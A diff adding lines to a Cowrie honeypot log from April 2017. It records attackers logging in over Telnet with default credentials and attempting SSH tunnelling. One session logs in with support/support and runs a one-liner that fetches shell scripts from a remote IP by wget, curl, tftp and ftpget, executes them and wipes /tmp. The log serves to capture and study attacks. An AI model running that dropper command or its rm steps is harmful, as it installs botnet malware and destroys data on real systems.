@@ -5313,3 +5313,80 @@
 2017-04-05T01:50:55+0000 [SSHChannel None (37) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83826,91.195.103.199] remote eof
 2017-04-05T01:50:55+0000 [SSHChannel None (37) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83826,91.195.103.199] remote close
 2017-04-05T01:50:55+0000 [SSHChannel None (37) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83826,91.195.103.199] sending close 37
+2017-04-05T01:51:06+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,83826,91.195.103.199] got channel 'direct-tcpip' request
+2017-04-05T01:51:06+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,83826,91.195.103.199] direct-tcp connection request to 98.138.112.34:25 from localhost:5556
+2017-04-05T01:51:10+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,83825,91.195.103.183] got channel 'direct-tcpip' request
+2017-04-05T01:51:10+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,83825,91.195.103.183] direct-tcp connection request to 107.189.171.198:80 from localhost:5556
+2017-04-05T01:51:10+0000 [SSHChannel None (95) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83825,91.195.103.183] direct-tcp forward to 107.189.171.198:80 with data 'GET /ip/header?id_ip=15596902155&id_provider=19 HTTP/1.1\r\nHost: ipinfoplz.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4\r\nX-Group: 19\r\nX-Id: 15596902155\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'
+2017-04-05T01:51:10+0000 [SSHChannel None (95) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83825,91.195.103.183] failed to connect: Connection refused
+2017-04-05T01:51:10+0000 [SSHChannel None (95) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83825,91.195.103.183] sending close 95
+2017-04-05T01:51:26+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 195.154.17.225:51082 (10.8.41.81:2223) [session: TT197047]
+2017-04-05T01:51:27+0000 [CowrieTelnetTransport,197047,195.154.17.225] login attempt: 24
+2017-04-05T01:51:27+0000 [CowrieTelnetTransport,197047,195.154.17.225] login return, expect: [support/support]
+2017-04-05T01:51:29+0000 [CowrieTelnetTransport,197047,195.154.17.225] login attempt [support/support] succeeded
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197047,195.154.17.225] Opening TTY Log: log/tty/20170405-015130-None-197047i.log
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197047,195.154.17.225] Warning: state changed and new state returned
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197046,178.80.152.146] Closing TTY Log: log/tty/20170405-014945-None-197046i.log after 105 seconds
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197046,178.80.152.146] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197046,178.80.152.146] Connection lost after 109 seconds
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197047,195.154.17.225] CMD: sh
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197047,195.154.17.225] Command found: sh 
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197047,195.154.17.225] CMD: shell
+2017-04-05T01:51:30+0000 [CowrieTelnetTransport,197047,195.154.17.225] Command not found: shell
+2017-04-05T01:51:31+0000 [CowrieTelnetTransport,197047,195.154.17.225] CMD: help
+2017-04-05T01:51:31+0000 [CowrieTelnetTransport,197047,195.154.17.225] Command found: help 
+2017-04-05T01:51:31+0000 [CowrieTelnetTransport,197047,195.154.17.225] CMD: busybox
+2017-04-05T01:51:31+0000 [CowrieTelnetTransport,197047,195.154.17.225] Command found: busybox 
+2017-04-05T01:51:32+0000 [SSHChannel None (38) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83826,91.195.103.199] remote eof
+2017-04-05T01:51:32+0000 [SSHChannel None (38) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83826,91.195.103.199] remote close
+2017-04-05T01:51:32+0000 [SSHChannel None (38) on SSHService 'ssh-connection' on HoneyPotSSHTransport,83826,91.195.103.199] sending close 38
+2017-04-05T01:51:39+0000 [CowrieTelnetTransport,197047,195.154.17.225] CMD: cd /tmp; rm -fr *; wget http://163.172.99.61/bins.sh; curl -O http://163.172.99.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 163.172.99.61 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 163.172.99.61; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 163.172.99.61 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-04-05T01:51:39+0000 [CowrieTelnetTransport,197047,195.154.17.225] Command found: cd /tmp
+2017-04-05T01:51:39+0000 [CowrieTelnetTransport,197047,195.154.17.225] Command found: rm -fr /tmp/.X11-unix /tmp/.ICE-unix
+2017-04-05T01:51:39+0000 [CowrieTelnetTransport,197047,195.154.17.225] Command found: wget http://163.172.99.61/bins.sh
+2017-04-05T01:51:39+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://163.172.99.61/bins.sh>
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Not storing duplicate content 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Downloaded URL (http://163.172.99.61/bins.sh) with SHA-256 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd to dl/655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: curl -O http://163.172.99.61/bins.sh
+2017-04-05T01:51:39+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://163.172.99.61/bins.sh>
+2017-04-05T01:51:39+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://163.172.99.61/bins.sh>
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Not storing duplicate content 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Downloaded URL (http://163.172.99.61/bins.sh) with SHA-256 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd to dl/655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: chmod 777 /tmp/bins.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: sh /tmp/bins.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: tftp 163.172.99.61 -c get tftp1.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 163.172.99.61
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 163.172.99.61 ftp1.sh ftp1.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://163.172.99.61/ftp1.sh) with SHA-256 5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58 to dl/5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: sh /tmp/ftp1.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh tftp1.sh tftp2.sh /tmp/ftp1.sh
+2017-04-05T01:51:39+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-05T01:51:39+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://163.172.99.61/bins.sh>
+2017-04-05T01:51:47+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 58.40.45.200:47180 (10.8.41.81:2223) [session: TT197048]
+2017-04-05T01:51:49+0000 [CowrieTelnetTransport,197047,195.154.17.225] Not storing duplicate content 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-04-05T01:51:49+0000 [CowrieTelnetTransport,197047,195.154.17.225] Saved redir contents with SHA-256 655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd to dl/655fbc0d23437490403ba41eb3227f1734e209b2f5020919e079c2930caf71bd
+2017-04-05T01:51:49+0000 [CowrieTelnetTransport,197047,195.154.17.225] Not storing duplicate content 5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58
+2017-04-05T01:51:49+0000 [CowrieTelnetTransport,197047,195.154.17.225] Saved redir contents with SHA-256 5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58 to dl/5dab9d910f440c8978c960aa5228ffba42e5a6782b1ae282b5805e4e503e1d58
+2017-04-05T01:51:49+0000 [CowrieTelnetTransport,197047,195.154.17.225] Closing TTY Log: log/tty/20170405-015130-None-197047i.log after 18 seconds
+2017-04-05T01:51:49+0000 [CowrieTelnetTransport,197047,195.154.17.225] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-04-05T01:51:49+0000 [CowrieTelnetTransport,197047,195.154.17.225] Connection lost after 22 seconds
+2017-04-05T01:51:51+0000 [CowrieTelnetTransport,197048,58.40.45.200] first time for 58.40.45.200, found cached: root:password
+2017-04-05T01:51:53+0000 [CowrieTelnetTransport,197048,58.40.45.200] login attempt [root/password] succeeded
+2017-04-05T01:51:55+0000 [CowrieTelnetTransport,197048,58.40.45.200] Opening TTY Log: log/tty/20170405-015155-None-197048i.log
+2017-04-05T01:51:55+0000 [CowrieTelnetTransport,197048,58.40.45.200] Warning: state changed and new state returned
+2017-04-05T01:51:56+0000 [CowrieTelnetTransport,197048,58.40.45.200] Received unhandled keyID: '\x00'
+2017-04-05T01:51:56+0000 [CowrieTelnetTransport,197048,58.40.45.200] CMD: enable
+2017-04-05T01:51:56+0000 [CowrieTelnetTransport,197048,58.40.45.200] Command found: enable 
+2017-04-05T01:51:56+0000 [CowrieTelnetTransport,197048,58.40.45.200] Reading txtcmd from "txtcmds/bin/enable"
+2017-04-05T01:51:58+0000 [CowrieTelnetTransport,197048,58.40.45.200] Received unhandled keyID: '\x00'
+2017-04-05T01:51:59+0000 [CowrieTelnetTransport,197048,58.40.45.200] CMD: system
+2017-04-05T01:51:59+0000 [CowrieTelnetTransport,197048,58.40.45.200] Command not found: system
+2017-04-05T01:51:59+0000 [CowrieTelnetTransport,197048,58.40.45.200] Received unhandled keyID: '\x00'
+2017-04-05T01:51:59+0000 [CowrieTelnetTransport,197048,58.40.45.200] CMD: shell
+2017-04-05T01:51:59+0000 [CowrieTelnetTransport,197048,58.40.45.200] Command not found: shell
